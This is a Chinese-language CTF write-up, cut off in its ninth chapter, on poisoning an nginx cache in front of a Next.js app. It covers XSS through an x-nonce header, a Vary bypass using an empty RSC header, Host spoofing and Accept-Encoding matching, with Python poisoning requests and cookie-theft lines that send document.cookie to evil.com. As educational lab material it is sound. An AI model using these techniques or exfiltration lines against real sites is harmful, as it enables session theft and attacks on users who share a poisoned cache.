# future.js — Web Cache Poisoning 完整 Writeup

> CTF: CyberGame 2026 (SK-CERT) | 分类: Web | 难度: Hard
>
> Flag: `SK-CERT{seriously_why??????}`

---

## 目录

- [第一章：你需要先知道的知识](#第一章你需要先知道的知识)
- [第二章：这道题是什么结构](#第二章这道题是什么结构)
- [第三章：寻找攻击入口](#第三章寻找攻击入口)
- [第四章：第一个大坑——nginx 只缓存 /_next/ 路径](#第四章第一个大坑nginx-只缓存-_next-路径)
- [第五章：第二个大坑——Vary 头挡住了我们](#第五章第二个大坑vary-头挡住了我们)
- [第六章：关键突破——空 RSC 头绕过 Vary](#第六章关键突破空-rsc-头绕过-vary)
- [第七章：第三个大坑——Host 对不上](#第七章第三个大坑host-对不上)
- [第八章：第四个大坑——Accept-Encoding 对不上](#第八章第四个大坑accept-encoding-对不上)
- [第九章：第五个大坑——Docker 没有外网](#第九章第五个大坑docker-没有外网)
- [第十章：完整攻击复现](#第十章完整攻击复现)
- [第十一章：总结](#第十一章总结)

---

## 第一章：你需要先知道的知识

在讲这道题之前，先理解几个概念。如果你已经懂了可以跳过。

### 1.1 HTTP 请求长什么样？

当你用浏览器访问一个网站时，浏览器会发送一个 HTTP 请求。比如访问 `http://example.com/page`：

```
GET /page HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 ...
Accept: text/html
Accept-Encoding: gzip, deflate, br
Cookie: session=abc123
```

- **第一行**：请求方法（GET）+ 路径（/page）+ 协议版本
- **后面的行**：请求头（headers），是键值对，每行一个
- 服务器收到后返回响应：

```
HTTP/1.1 200 OK
Content-Type: text/html
Vary: Accept-Encoding
Set-Cookie: session=abc123

<html>页面内容...</html>
```

- **第一行**：状态码（200 表示成功）
- **后面的行**：响应头
- **空一行之后**：响应体（HTML 内容）

### 1.2 什么是 XSS（跨站脚本攻击）

XSS（Cross-Site Scripting，跨站脚本攻击）是让网页执行攻击者注入的 JavaScript 代码。

**关于"跨站"这个名称的误解**：XSS 的英文原名 Cross-Site Scripting 容易造成歧义，让人以为攻击是"从一个网站攻击另一个网站"。但实际上，XSS 攻击发生在**同一个网站内部**——攻击者把恶意 JavaScript 注入到目标网站的页面中。当受害者用浏览器访问这个页面时，恶意代码在受害者的浏览器里执行，而且浏览器认为这段代码来自目标网站（因为它确实是目标网站返回的页面内容）。也就是说，XSS 的本质是**同源攻击**：恶意脚本和目标网站是同一个"源"（same-origin），所以浏览器赋予它完整的权限——能读取该网站的 Cookie、能操作该页面的 DOM、能以该网站的身份发送请求。"跨站"这个名字，指的是攻击者**想要达到的效果**（把数据从目标网站"跨"到攻击者手里），而不是说脚本运行在不同的网站上。

正常情况下，网页内容是服务器控制的，用户无法往里插入代码。但如果服务器把关不严，攻击者可以构造恶意输入，让页面包含 `<script>alert(1)</script>` 这样的标签，浏览器会执行它。

一旦 XSS 在受害者的浏览器里执行，这段 JavaScript 就拥有该网站的全部权限，可以做以下事情：

- **读取当前网站的 Cookie**：通过 `document.cookie` 获取该域名下的所有 Cookie（只要 Cookie 没有设置 `httpOnly`，详见下一节）
- **把数据发送到攻击者控制的服务器**：比如执行 `fetch('https://evil.com/steal?data=' + document.cookie)`，把 Cookie 发送到攻击者的服务器
- **修改页面内容**：替换页面上的文字、链接、表单等

你可能会有疑问：浏览器不是有跨域限制吗？从一个域名（比如 `http://proxy:4000`）发请求到另一个域名（比如 `https://evil.com`），不是会被浏览器拦截吗？

这里有一个常见的误解需要澄清。浏览器的同源策略（Same-Origin Policy）确实有跨域限制，但这个限制是**单向的**：它禁止的是 JavaScript **读取**跨域请求的**响应内容**，但**不禁止发送跨域请求本身**。换句话说：

```
浏览器中的 JavaScript 执行：
  fetch('https://evil.com/steal?cookie=xxx')

实际发生的事情：
  1. 浏览器确实会发送这个 HTTP 请求到 evil.com        ← ✅ 允许发送
  2. evil.com 服务器确实会收到这个请求和 cookie 数据   ← ✅ 攻击者拿到数据了
  3. 但 JavaScript 无法读取 evil.com 返回的响应内容    ← 这就是"跨域限制"

对于数据窃取来说，攻击者只需要第 1、2 步——把数据发出去就够了。
第 3 步（读取响应）对窃取数据根本不重要。
```

更简单的窃取方式甚至不需要 `fetch`，只需要一行代码：

```javascript
new Image().src = 'https://evil.com/steal?c=' + document.cookie
```

浏览器加载图片天然就是跨域的，没有任何限制。攻击者的服务器只要记录下请求中的参数就拿到 Cookie 了。所以**跨域限制无法阻止 XSS 窃取数据**。

### 1.3 什么是 Cookie

Cookie 是浏览器存储的小数据。服务器通过 `Set-Cookie` 响应头设置：

```
Set-Cookie: flag=SK-CERT{...}; Path=/
```

之后浏览器每次请求同一域名时都会自动带上：

```
Cookie: flag=SK-CERT{...}
```

**注意**：这个"自动带上"的行为与 Cookie 的任何属性都无关——无论 Cookie 怎么配置，浏览器都会在每次请求时自动附带。后面讲到的 `httpOnly` 属性**只影响 JavaScript 能否读取 Cookie 的值**，不影响浏览器发送 Cookie。

Cookie 有个属性叫 `httpOnly`：
- `httpOnly=true`：JavaScript 无法通过 `document.cookie` 读取这个 Cookie。但浏览器**仍然会**在每次请求时自动发送它。这就是为什么鉴权类 Cookie（如 session token）通常都会设置 `httpOnly=true`——浏览器照常发送它做身份验证，但即使页面被 XSS 攻击，JavaScript 也无法偷走 session token。
- `httpOnly=false`：JavaScript 可以通过 `document.cookie` 读取这个 Cookie 的值。

这道题中，Bot 的 flag Cookie 被设置为 `httpOnly: false`。具体代码在 `bot/server.js` 第 59-65 行：

```javascript
// examples/web/handout_futurejs/bot/server.js 第 59-65 行
await page.setCookie({
  name: 'flag',
  value: FLAG,                          // FLAG 环境变量 = CTF 的 flag
  url: 'http://proxy:4000',             // Cookie 绑定到 proxy:4000 域名
  path: '/',
  httpOnly: false,                      // ← 关键：JavaScript 可以读取！
})
```

`FLAG` 的值来自环境变量，在 `docker-compose.yml` 第 31 行定义为 `SK-CERT{fake_flag}`（比赛时是真实的 flag）。这里故意设为 `httpOnly: false`，是为了让这道题可以通过 XSS 读取 Cookie 来获取 flag——否则 XSS 就没意义了。

在实际生产环境中，**鉴权类的 Cookie（如 session token）应该设置 `httpOnly: true`**，因为浏览器发送 Cookie 不受 httpOnly 影响（前面说过，浏览器每次请求都会自动附带），设置 `httpOnly: true` 只是让 JavaScript 无法读取它，从而防止 XSS 窃取 session。

### 1.4 什么是缓存（Cache）

为了加速网页加载，可以在用户和服务器之间加一个"缓存代理"。

```
没有缓存：用户 ──────────────→ 服务器（每次都请求）
                    互联网

有缓存：   用户 ──→ 缓存 ──→ 服务器（只在缓存没有时才请求服务器）
                   │
                   └─ 缓存有就直接返回，不用麻烦服务器
```

这道题中，**nginx** 就是那个缓存代理。它收到请求后：
1. 先看缓存里有没有
2. 有就直接返回（HIT）
3. 没有就转发给后面的 Next.js 服务器，然后把响应缓存起来（MISS）

**CDN 也有缓存**：CDN（Content Delivery Network，内容分发网络）比如 Cloudflare、Akamai，本质上是分布在全球各地的缓存代理。CDN 和这道题中的 nginx 缓存原理完全相同——收到请求时先查缓存，命中就返回缓存的副本。因此，**如果 CDN 的缓存被投毒（污染），攻击效果和这道题是一样的**：所有访问同一 URL 的用户都会收到被投毒的响应。实际上，CDN 缓存投毒是真实世界中已经被发现和利用过的攻击方式，不是只有 CTF 才会遇到的。

### 1.5 什么是 Vary 头

缓存需要知道：两个不同的请求，是否应该被视为"同一个"。

比如，同一个 URL，用浏览器访问返回 HTML，用 API 调用返回 JSON。如果缓存不区分，就会把 JSON 返回给浏览器，出大问题。

**Vary 头就是告诉缓存："根据这些请求头的值来区分缓存"。**

例如：

```
Vary: Accept-Encoding
```

意思是：`Accept-Encoding` 值不同的请求，要用不同的缓存副本。

```
请求A: Accept-Encoding: gzip    → 用缓存副本A
请求B: Accept-Encoding: br      → 用缓存副本B（不匹配，要重新请求服务器）
```

**这道题中 Vary 头的来源**：Next.js 框架在所有 App Router 响应中自动添加 Vary 头。具体代码在 `next/dist/server/base-server.js` 的 `setVaryHeader` 函数中：

```javascript
// next/dist/server/base-server.js 中的 setVaryHeader 函数（简化）
function setVaryHeader(res) {
  const baseVaryHeader =
    "rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch"
  res.setHeader('Vary', baseVaryHeader)
}
```

这个函数在每次 App Router 请求处理时都会被调用，给响应加上 Vary 头。注意这里的 4 个参数都是 Next.js 自定义的请求头，用来区分不同类型的 Next.js 请求。最终响应中的 Vary 头还可能包含 `Accept-Encoding`（由 nginx 或其他中间件添加）。

这些 Vary 参数各自的含义：

| 参数 | 含义 | 缓存影响 |
|------|------|---------|
| `rsc` | 是否为 React Server Components 请求（请求头 `RSC` 的值） | `RSC: 1` 和没有 RSC 头的请求返回不同格式的响应（flight data vs HTML），必须分开缓存 |
| `next-router-state-tree` | 客户端路由状态树（请求头 `Next-Router-State-Tree` 的值） | Next.js 客户端导航时携带，不同路由状态对应不同的服务端渲染结果 |
| `next-router-prefetch` | 是否为预取请求（请求头 `Next-Router-Prefetch` 的值） | 预取请求返回的数据量更少（用于加速页面切换） |
| `next-router-segment-prefetch` | 是否为段落级预取（请求头 `Next-Router-Segment-Prefetch` 的值） | Next.js 15 新增的更细粒度预取机制 |
| `Accept-Encoding` | 客户端支持的压缩格式（`gzip`、`deflate`、`br` 等） | 不同压缩格式的响应内容不同（压缩后的二进制不同），必须分开缓存 |

对这道题的攻击来说，最关键的两个参数是 `rsc` 和 `Accept-Encoding`。普通浏览器用户访问网页时**不会发送 `RSC` 头**，也不会发送 `Next-Router-*` 这些头——这些头只有 Next.js 的前端框架在内部导航时才会添加。因此，Bot 的浏览器发出的请求中，这些头的值全部是"空"（不存在）。

### 1.6 什么是 Next.js 和 RSC

**Next.js** 是一个 React 框架。这道题用的是 Next.js 的 **App Router** 模式。

**RSC（React Server Components）** 是 Next.js 的一种渲染方式。Next.js 根据请求中是否包含 `RSC` 这个请求头来决定使用哪种渲染方式：

- **普通请求**（浏览器直接访问网页，**不带** `RSC` 请求头）→ 返回完整 HTML 页面
- **RSC 请求**（带了 `RSC: 1` 请求头）→ 返回 **flight data**

这里说的 "`RSC: 1` 请求头"，是指在 HTTP 请求中添加一个名为 `RSC`、值为 `1` 的请求头：

```
GET /some-page HTTP/1.1
Host: example.com
RSC: 1                         ← 这就是"带了 RSC: 1 请求头"的意思
```

这个请求头不是浏览器自动发送的，而是 Next.js 的前端 JavaScript 代码在**客户端导航**（比如用户点击页面上的链接，而不是刷新整个页面）时自动添加的。当 Next.js 前端检测到响应是 flight data 时，它会用这个数据来更新页面上的组件，而不是重新加载整个 HTML。

**flight data 是什么**：它是 React 的内部序列化格式，用于在服务端和客户端之间传递组件树的状态和渲染结果。它看起来像一系列带数字前缀的文本行，比如：

```
0:["$","html",null,{"lang":"en","children":[...]}]
1:["$","body",null,{"nonce":"<script>alert(1)</script>","children":[...]}]
```

**为什么 flight data 里的 `<` 不转义**：这不是因为 `RSC: 1` 这个头有什么特殊含义，而是因为**输出格式不同**。HTML 页面需要被浏览器解析为 HTML，所以特殊字符必须转义（`<` → `&lt;`）。而 flight data 是给 Next.js 前端 JavaScript 代码解析的，它的序列化方式类似 JSON，不需要 HTML 转义——就像 JSON 里 `"name":"<script>"` 中的 `<` 不需要转义一样。

正常情况下这没有安全问题，因为浏览器收到 flight data 时，它的 Content-Type 是 `text/x-component`（不是 `text/html`），浏览器不会把它当作 HTML 来解析，里面的 `<` 就只是普通字符。**但如果攻击者能把 Content-Type 改成 `text/html`**，浏览器就会把 flight data 当 HTML 解析，里面未转义的 `<script>` 就会变成真正执行的 JavaScript 代码——这就是 XSS。

### 1.7 CTF 中的 Bot 是什么

Web 安全 CTF 中，通常有一个"Bot"（机器人）程序，模拟真实用户的行为。

在这道题里，Bot 的角色是**受害者**。攻击者（你）的目标是：让 Bot 的浏览器执行你注入的 JavaScript 代码，从而窃取 Bot 的 Cookie。

具体流程是这样的：

1. 攻击者可以提供一个 URL 给 Bot
2. Bot 会用 Puppeteer（一个控制 Chromium 浏览器的工具）打开这个 URL
3. Bot 的浏览器里预先设置了一个名为 `flag` 的 Cookie，它的值就是这道 CTF 题的答案（比如 `SK-CERT{seriously_why??????}`）。在 CTF 中，"flag"就是每道题的答案/通关密码，你需要想办法获取它
4. 攻击者的目标是：构造一个含有 XSS 的页面，让 Bot 的浏览器访问后执行 XSS，读取 `document.cookie`（其中包含 `flag=SK-CERT{...}`），然后把值传回给攻击者

---

## 第二章：这道题是什么结构

### 2.1 整体架构

```
                         Docker 内部网络
                     ┌─────────────────────────┐
                     │                         │
用户（攻击者）        │    ┌─────────┐   ┌─────────┐   ┌─────────┐
    │                │    │         │   │         │   │         │
    │  访问 4000 端口 │    │  nginx  │   │ Next.js │   │   Bot   │
    │────────────────│──→│  (缓存)  │──→│  (app)  │   │(Puppeteer)│
                     │    │         │   │         │   │         │
                     │    └─────────┘   └─────────┘   └─────────┘
                     │         │                            │
                     │         │     Bot 的浏览器有 flag Cookie
                     │         │     Bot 可以被指示访问任意 URL
                     └─────────────────────────────────────┘
```

三个 Docker 容器（定义在 `docker-compose.yml` 中）：
- **nginx**（服务名 `proxy`，端口 4000 暴露到外网）：反向代理 + 缓存
- **Next.js app**（服务名 `app`，端口 3000，仅 Docker 内部可访问）：Web 应用
- **Bot**（服务名 `bot`，端口 3000，仅 Docker 内部可访问）：Puppeteer 无头浏览器

**关于 Docker 内部网络**：Docker Compose 会自动创建一个内部网络，容器之间可以用**服务名**互相访问。比如 nginx 容器可以用 `http://app:3000` 访问 Next.js 应用，Bot 容器可以用 `http://proxy:4000` 访问 nginx。这些服务名（`app`、`proxy`、`bot`）是 Docker 内部的 DNS 名称，只有在 Docker 内部网络中才能解析。

所以：
- 外部用户（攻击者）通过公网 IP 访问：`http://46.62.153.171:4000`
- Bot（在 Docker 内部）通过服务名访问：`http://proxy:4000`

这两个地址指向的是**同一个 nginx 容器**，但 Host 头不同——这一点后面会成为关键问题。

### 2.2 nginx 配置（关键部分）

```nginx
# 只缓存 /_next/ 开头的路径！
location ^~ /_next/ {
    proxy_pass http://next_app;
    proxy_cache futurejs_cache;              # 开启缓存
    proxy_cache_key "$request_method|$scheme://$host$request_uri";  # 缓存主键
    proxy_cache_valid any 5m;                # 缓存 5 分钟
    proxy_ignore_headers Cache-Control Expires Set-Cookie;  # 忽略这些头
}

# 普通路径，没有缓存！
location / {
    proxy_pass http://next_app;
    # 没有 proxy_cache 等指令
}
```

**注意**：只有 `/_next/` 开头的路径会被缓存。`/`、`/about` 等普通路径不会缓存。

**缓存键（cache key）的规则**：nginx 用 `proxy_cache_key` 指令定义什么算"同一个缓存"。这里的值是：

```
$request_method|$scheme://$host$request_uri
```

展开后就是 `GET|http://proxy:4000/_next/pwn` 这样的字符串。nginx 对每个请求算出这个字符串，去缓存里查找：如果找到相同字符串的缓存条目，就返回缓存（HIT）；找不到就请求后端服务器，然后把响应缓存起来（MISS）。

但这只是**主键（primary key）**。nginx 还会看响应中的 `Vary` 头来创建**二级键（secondary key）**。完整匹配规则是：

```
缓存命中条件：
  1. 主键相同：请求方法 + URL（含 Host）完全一致
  2. 二级键相同：Vary 头中列出的每个请求头的值也必须一致
```

举个例子，如果缓存的响应带了 `Vary: rsc, Accept-Encoding`，那么：
- 主键：`GET|http://proxy:4000/_next/pwn`
- 二级键：`rsc=空值`，`Accept-Encoding=gzip, deflate`

另一个请求要命中这个缓存，必须主键匹配（同一个方法和 URL），**并且**它的 `RSC` 头的值和 `Accept-Encoding` 头的值都和缓存时记录的一样。任何一个不匹配就是 MISS。

### 2.3 Next.js 应用（关键文件）

**middleware.ts**（中间件——每个请求都会经过）：

```typescript
// examples/web/handout_futurejs/middleware.ts
export function middleware(request: NextRequest) {
    // 1. 如果 URL 有查询参数（?xxx=yyy），就 307 重定向去掉它们
    if (request.nextUrl.searchParams.size > 0) {
        const cleanUrl = request.nextUrl.clone()
        cleanUrl.search = ''
        return NextResponse.redirect(cleanUrl)  // 307 重定向
    }

    // 2. 如果请求带了 Content-Type 头，就把响应的 Content-Type 改成 text/html
    const contentType = getContentTypeFromHeader(request.headers.get('content-type'))
    if (contentType) {
        const response = NextResponse.next({ request: { headers: requestHeaders } })
        response.headers.set('Content-Type', contentType)  // 覆盖响应的 Content-Type（下文简称 CT）
        return response
    }

    // 3. 其他情况直接放行
    return NextResponse.next()
}
```

**关于 307 重定向**：307 是 HTTP 重定向状态码，意思是"你请求的资源临时搬到了另一个 URL，请重新请求那个新 URL"。浏览器的行为是：收到 307 响应后，自动向重定向的目标 URL 发起一个**全新的 HTTP 请求**。既然是全新的请求，它就会**再次经过 middleware 函数**——也就是说，重定向后的请求会重新执行上面代码的第 1 步（检查查询参数）、第 2 步（CT 覆盖）和第 3 步。在我们的攻击中，重定向后的 URL 没有查询参数（第 1 步不触发），也不带 Content-Type 头（第 2 步不触发），所以最终走到第 3 步直接放行。重定向响应本身不包含我们的 XSS payload，所以重定向不是攻击向量，但它说明了一个重要的流程细节。

**关于 CT（Content-Type）覆盖**：CT 是 Content-Type 的缩写，是 HTTP 响应头中的一个字段，告诉浏览器响应体的内容是什么格式。比如 `text/html` 表示 HTML 页面，`text/x-component` 表示 Next.js 的 flight data。浏览器的行为取决于 CT：如果 CT 是 `text/html`，浏览器就把响应体当 HTML 解析（会执行 `<script>` 标签）；如果 CT 是 `text/x-component`，浏览器不会当 HTML 解析。中间件的第 2 步做的事情是：如果请求带了 `Content-Type: text/html`，就把**响应**的 CT 强制改成 `text/html`——这就是把 flight data 变成"会被浏览器当 HTML 解析"的关键。

**app/layout.tsx**（页面布局——每个页面都会用到）：

```typescript
export default async function RootLayout({ children }) {
    const headerStore = await headers()
    const nonce = headerStore.get('x-nonce') || undefined  // 从请求头读 x-nonce

    return (
        <html lang="en">
            <body nonce={nonce}>{children}</body>  {/* nonce 放在 body 标签上 */}
        </html>
    )
}
```

**关键**：`nonce` 的值来自 HTTP 请求头 `x-nonce`。攻击者可以控制这个值。

### 2.4 Bot 代码（关键部分）

```javascript
// 设置 flag Cookie
await page.setCookie({
    name: 'flag',
    value: FLAG,                          // flag 值
    url: 'http://proxy:4000',             // Cookie 绑定到 proxy:4000 域名
    httpOnly: false,                      // JavaScript 可以读取！
})

// 访问攻击者指定的 URL
await page.goto(url, { timeout: 10000 })
```

---

## 第三章：寻找攻击入口

### 3.1 目标是什么？

让 Bot 的浏览器执行我们控制的 JavaScript，读取 Bot 的 `flag` Cookie，然后发送给我们。

### 3.2 注入点在哪里？

**`x-nonce` 请求头！**

layout.tsx 把 `x-nonce` 请求头的值放到了 `<body nonce="...">` 属性里。

如果我发送 `x-nonce: <script>alert(1)</script>`，会怎样？

这取决于响应类型：

**HTML 响应（普通请求，不带 RSC 头）**：
```html
<body nonce="&lt;script&gt;alert(1)&lt;/script&gt;">
<!--                         ^^^^^^^^^^ 安全！< 被转义成了 &lt; -->
```

HTML 里 `<` 会被转义成 `&lt;`，所以 XSS 不生效。这是因为 HTML 渲染器知道属性值和文本中可能出现特殊字符，会自动转义。

**RSC flight data 响应（带 `RSC: 1` 头的请求）**：
```
"nonce":"<script>alert(1)</script>"
<!--       ^ 没有转义！ -->
```

flight data 里 `<` **不会转义**——不是因为 `RSC: 1` 有什么魔法，而是因为 flight data 的序列化格式本来就不是 HTML，它的设计者认为不需要 HTML 转义。在正常使用中这完全没问题，因为 flight data 的 CT 是 `text/x-component`，浏览器不会把它当 HTML 解析。

但正如前面所说，如果攻击者同时利用中间件的 CT 覆盖功能，把 CT 改成 `text/html`，浏览器就会把 flight data 当 HTML 解析，其中未转义的 `<script>` 就变成了真正执行的 JavaScript——XSS 就生效了。

### 3.3 攻击思路成型

如果能做到以下三步，就能构成完整攻击：

1. **发一个 RSC 请求**（带 `RSC: 1`），同时设置 `x-nonce` 为 XSS payload
2. **把响应的 Content-Type 改成 `text/html`**，让浏览器把 flight data 当 HTML 解析
3. **让这个响应被缓存**，这样 Bot 访问同一 URL 时会命中缓存，拿到我们投毒的响应

中间件的 Content-Type 覆盖正好可以完成第 2 步！只要请求带 `Content-Type: text/html`，响应的 CT 就会被覆盖。

---

## 第四章：第一个大坑——nginx 只缓存 /_next/ 路径

### 4.1 我们的初始尝试

一开始，我们把攻击目标定在 `/`（首页），发送：

```
GET / HTTP/1.1
RSC: 1
Content-Type: text/html
x-nonce: <script>alert(1)</script>
```

Next.js 返回了 RSC flight data，Content-Type 被覆盖成了 `text/html`，XSS payload 未转义。看起来很完美。

### 4.2 为什么不行？

仔细看 nginx 配置：

```nginx
location ^~ /_next/ {
    proxy_cache futurejs_cache;   # ← 有缓存
    ...
}

location / {
    proxy_pass http://next_app;   # ← 没有缓存！
    ...
}
```

**`/` 走的是 `location /`，根本没有缓存指令！** 

所以我们的投毒响应根本没有被缓存，Bot 访问 `/` 时会直接拿到 Next.js 的新鲜响应（正常的 HTML，没有 XSS）。

### 4.3 解决办法

必须用 `/_next/` 开头的路径。比如 `/_next/anything`。

这种路径 nginx 会缓存。而且 Next.js 会返回 404 页面（因为没有这个路由），但 404 页面仍然经过 App Router 的 layout.tsx，所以 nonce 仍然会出现。

```
/_next/pwn   →   nginx 缓存 ✓   →   Next.js 404 页面（有 layout + nonce）✓
```

---

## 第五章：第二个大坑——Vary 头挡住了我们

### 5.1 Vary 问题的本质

Next.js 在所有 App Router 响应中都加了 Vary 头（代码位置见 1.5 节），最终响应中的完整 Vary 值是：

```
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
```

这意味着 nginx 缓存会根据这些请求头的值来创建二级键，区分不同的缓存副本。

### 5.2 具体怎么挡的

当我们投毒时（带 `RSC: 1`）：

```
投毒请求:  RSC: 1    → nginx 记录: rsc=1
Bot 请求:  (没有RSC)  → nginx 查找: rsc=(空)
                        1 ≠ (空) → 不匹配 → MISS！
```

Bot 的浏览器正常访问网页时**不会发送 `RSC` 头**，所以 Vary 匹配失败，Bot 拿不到我们的投毒响应。

### 5.3 我们尝试过的方法（全部失败）

| 尝试 | 为什么失败 |
|------|-----------|
| 让 Bot 发 RSC 头 | Bot 只是 `page.goto()`，无法控制请求头 |
| 用 `RSC: 0` 或其他值 | Vary 值还是不匹配 Bot 的空值 |
| 307 重定向（query 参数触发） | 重定向响应没有 XSS payload |
| HTTP 走私 | nginx 1.27 防御了 |
| 路径中注入 `<` | Next.js 不解码 `%3C` |
| 覆盖 Vary 头 | 中间件不能删除/修改 Vary（Vary 是路由处理器加的） |
| `_next/data/` 路径绕过 | App Router 下这个路径不存在 |

这些尝试花了我们大量时间，每一个都需要实际发送 HTTP 请求去验证。

---

## 第六章：关键突破——空 RSC 头绕过 Vary

### 6.1 灵感来源

Next.js 有两个核心模块参与了 RSC 请求的处理，它们的职责不同：

- **`base-server.js`**：HTTP 请求的总调度器。它接收每个 HTTP 请求，判断请求类型（普通页面？RSC？静态资源？），然后分发给对应的处理流程。它使用 `req.headers['rsc'] === '1'`（严格匹配）来判定是否为 RSC 请求。
- **`app-render.js`**：App Router 的渲染引擎。它负责实际的 React 组件渲染——决定输出 HTML 还是 flight data。它使用 `headers['rsc'] !== undefined`（宽松匹配）来判定是否按 RSC 模式渲染。

我们在这两个模块中发现了**两个不同的 RSC 检查逻辑**：

**base-server.js（第 179 行）**——严格检查：
```javascript
} else if (req.headers['rsc'] === '1') {    // 必须严格等于 '1'
    addRequestMeta(req, 'isRSCRequest', true);
```

**app-render.js（第 102 行）**——宽松检查：
```javascript
const isRSCRequest = headers['rsc'] !== undefined;  // 只要存在就行，不管值是什么
```

也就是说：如果发送 `RSC: ""`（空字符串）：
- base-server.js：`"" === "1"` → false → 不标记为 RSC 请求（但不影响后续处理）
- app-render.js：`"" !== undefined` → **true → 仍然按 RSC 模式渲染，输出 flight data！**

### 6.2 为什么空值能绕过 Vary

nginx 使用内建变量 `$http_<header_name>` 来获取请求头的值。`$http_rsc` 就是请求头 `RSC` 的值——这是 nginx 的命名规则：`$http_` 前缀加上小写的请求头名称。类似地，`$http_accept_encoding` 就是 `Accept-Encoding` 头的值，`$http_content_type` 就是 `Content-Type` 头的值。

当 nginx 需要比较 Vary 的二级键时，它用这些变量来获取请求头的值。关键在于 nginx 如何处理"请求头不存在"的情况：

```
情况1：请求带了 RSC: ""（空字符串）
  → nginx 的 $http_rsc = ""（空字符串）

情况2：请求没有带 RSC 头（普通浏览器访问就是这样）
  → nginx 的 $http_rsc = ""（也是空字符串！）
```

nginx 把"缺失的 header"和"值为空的 header"等同对待，都会被当作空字符串 `""`。

所以当我们用 `RSC: ""` 投毒时：

```
投毒请求:  RSC: ""（空字符串）→ nginx 记录二级键: rsc = ""（空字符串）
Bot 请求:  不发 RSC 头       → nginx 查找二级键: rsc = ""（空字符串）

两个 "" == "" → 匹配 → HIT！
```

**Bot 的浏览器为什么不发 RSC 头**：因为 Bot 只是简单地用 `page.goto(url)` 打开一个 URL，这和你在浏览器地址栏输入 URL 按回车一样——浏览器只发送标准的 HTTP 头（`Host`、`User-Agent`、`Accept-Encoding` 等），不会发送 `RSC` 这种自定义头。只有 Next.js 的前端 JavaScript 代码在做**客户端导航**（点击链接不刷新页面）时才会自动添加 `RSC: 1` 头。

### 6.3 验证

```python
# Step 1: 投毒（带空的 RSC 头）
conn.request('GET', '/_next/test', headers={
    'RSC': '',                    # 空字符串
    'Content-Type': 'text/html',
    'x-nonce': '<script>TEST</script>'
})
# 响应: RSC flight data，XSS 未转义，Cache: MISS

# Step 2: 模拟 Bot（不带 RSC 头）
conn.request('GET', '/_next/test')
# 响应: 同样的 RSC flight data，XSS 还在！Cache: HIT
```

**Vary 绕过成功！** 这是我们花了最长时间才找到的突破点。

---

## 第七章：第三个大坑——Host 对不上

### 7.1 问题描述

nginx 的缓存主键包含 Host：

```nginx
proxy_cache_key "$request_method|$scheme://$host$request_uri";
```

其中 `$host` 是 nginx 从请求的 `Host` 头中提取的值。

- 我们从外网访问时，浏览器自动设置的 Host = `46.62.153.171:4000`
- Bot 从 Docker 内网访问时，它的浏览器访问的 URL 是 `http://proxy:4000/_next/pwn`，所以 Host = `proxy:4000`

```
我们的缓存主键: GET|http://46.62.153.171/_next/pwn
Bot 的缓存主键: GET|http://proxy/_next/pwn
→ 不匹配！Bot 不会命中我们投毒的缓存！
```

### 7.2 解决办法

投毒时手动设置 `Host: proxy:4000`：

```python
conn.request('GET', '/_next/pwn', headers={
    'Host': 'proxy:4000',         # 伪装成内部请求
    'RSC': '',
    'Content-Type': 'text/html',
    'x-nonce': XSS_PAYLOAD,
})
```

你可能会问：我们攻击的是 `http://46.62.153.171:4000/`，为什么把 Host 设成 `proxy:4000` 还能拿到正确的响应？原因如下：

1. 我们通过 TCP 连接到 `46.62.153.171:4000`——这个连接确实到达了 nginx 容器
2. 但 HTTP 请求中的 `Host` 头只是一个字符串，我们手动把它设成 `proxy:4000`
3. nginx 收到请求后，用 `$host`（即 `proxy`）来构建缓存主键。nginx 同时把请求转发给 `http://next_app`（即 `app:3000`），Next.js 应用收到请求后正常处理并返回响应
4. 由于缓存主键变成了 `GET|http://proxy/_next/pwn`，和 Bot 的缓存主键一致了

简单说：**我们通过外网 IP 连接 nginx，但让 nginx 以为请求是给 `proxy:4000` 的**。这样缓存主键就和 Bot 匹配了。

> **注意**：浏览器的 Fetch API 禁止修改 `Host` 头，所以这一步**必须用 Python/curl 等工具**，浏览器做不到。

---

## 第八章：第四个大坑——Accept-Encoding 对不上

### 8.1 问题描述

AE（Accept-Encoding，接受编码）是 HTTP 请求头之一，浏览器用它告诉服务器"我支持哪些压缩格式"。服务器收到后，可以选择用其中一种格式压缩响应，减少传输数据量。常见的压缩格式有：

| 格式 | 全称 | 说明 |
|------|------|------|
| `gzip` | GNU zip | 最通用的压缩格式，所有浏览器都支持 |
| `deflate` | deflate | 另一种压缩格式，和 gzip 类似 |
| `br` | Brotli | 较新的压缩格式，压缩率更高，但不是所有浏览器都支持 |

比如现代版 Chrome 发送的 AE 头是：

```
Accept-Encoding: gzip, deflate, br
```

意思是"我支持 gzip、deflate 和 brotli 三种压缩"。

而 Vary 头里包含 `Accept-Encoding`，所以 nginx 会根据 AE 的值创建不同的缓存副本。如果投毒时发的 AE 和 Bot 浏览器发的 AE 不一样，缓存就不匹配。

### 8.2 探测 Bot 的 Accept-Encoding

问题是：我们不知道 Bot 的 Chromium 发的 AE 是什么。

我们用了"多值投毒"法：对同一个路径，用多种 AE 值各投毒一次：

```python
# 用不同的 AE 值各发一次投毒请求
for ae in ['gzip, deflate, br', 'gzip, deflate', 'gzip', ...]:
    conn.request('GET', path, headers={
        'Host': 'proxy:4000',
        'RSC': '',
        'Content-Type': 'text/html',
        'x-nonce': XSS,
        'Accept-Encoding': ae,
    })
```

每种 AE 值会创建一个独立的缓存副本。Bot 的 AE 会匹配其中某一个。

### 8.3 发现 Bot 的真实 AE

通过检查 Bot 访问后的缓存状态，我们发现 Bot 的 Chromium 用的 AE 是：

```
gzip, deflate
```

注意：**没有 `br`（Brotli）**。这是因为 Bot 的 Docker 镜像使用的是 Debian 系统包中的 Chromium（不是 Google 官方的 Chrome）。系统包版本的 Chromium 没有编译 Brotli 支持，所以它的 AE 头里不包含 `br`。

这不影响网页的正常显示（gzip 和 deflate 足够了），但影响了我们的攻击——我们投毒时必须也用 `Accept-Encoding: gzip, deflate`（不带 `br`），否则 Vary 二级键中的 AE 值就不匹配，Bot 的请求不会命中我们的缓存。

---

## 第九章：第五个大坑——Docker 没有外网

### 9.1 问题描述

通常 XSS 窃取 Cookie 的方式是：在受害者的浏览器中执行 JavaScript，让这个 JavaScript 把 Cookie 发送到攻击者控制的外部服务器。代码类似：

```javascript
// 这段代码在受害者的浏览器中执行
fetch('https://evil.com/steal?c=' + document.cookie)
```

